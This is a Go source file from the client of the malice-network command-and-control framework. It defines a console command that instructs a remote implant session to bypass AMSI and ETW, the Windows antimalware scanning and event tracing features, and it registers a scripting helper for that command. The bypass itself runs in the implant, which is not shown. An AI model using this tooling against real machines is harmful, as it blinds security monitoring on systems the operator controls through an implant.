package sys

import (
	"fmt"
	"github.com/chainreactors/malice-network/client/command/common"
	"github.com/chainreactors/malice-network/client/core"
	"github.com/chainreactors/malice-network/client/repl"
	"github.com/chainreactors/malice-network/helper/consts"
	"github.com/chainreactors/malice-network/helper/proto/client/clientpb"
	"github.com/chainreactors/malice-network/helper/proto/implant/implantpb"
	"github.com/chainreactors/malice-network/helper/proto/services/clientrpc"
	"github.com/spf13/cobra"
)

func BypassCmd(cmd *cobra.Command, con *repl.Console) error {
	bypass_amsi, _ := cmd.Flags().GetBool("amsi")
	bypass_etw, _ := cmd.Flags().GetBool("etw")
	session := con.GetInteractive()
	task, err := Bypass(con.Rpc, session, bypass_amsi, bypass_etw)
	if err != nil {
		return err
	}
	session.Console(task, fmt.Sprintf("bypass_amsi %t, bypass_etw %t", bypass_amsi, bypass_etw))
	return nil
}

func Bypass(rpc clientrpc.MaliceRPCClient, session *core.Session, bypass_amsi, bypass_etw bool) (*clientpb.Task, error) {
	return rpc.Bypass(session.Context(), &implantpb.BypassRequest{
		ETW:      bypass_etw,
		AMSI:     bypass_amsi,
		BlockDll: false,
	})
}

func RegisterBypassFunc(con *repl.Console) {
	con.RegisterImplantFunc(
		consts.ModuleBypass,
		Bypass,
		"",
		nil,
		common.ParseStatus,
		nil,
	)

	con.AddInternalFuncHelper(
		consts.ModuleBypass,
		consts.ModuleBypass,
		fmt.Sprintf("%s(active(), true, true)", consts.ModuleBypass),
		[]string{
			"sess: special session",
			"bypass_amsi: bypass amsi",
			"bypass_etw: bypass etw",
		},
		[]string{"task"})
}
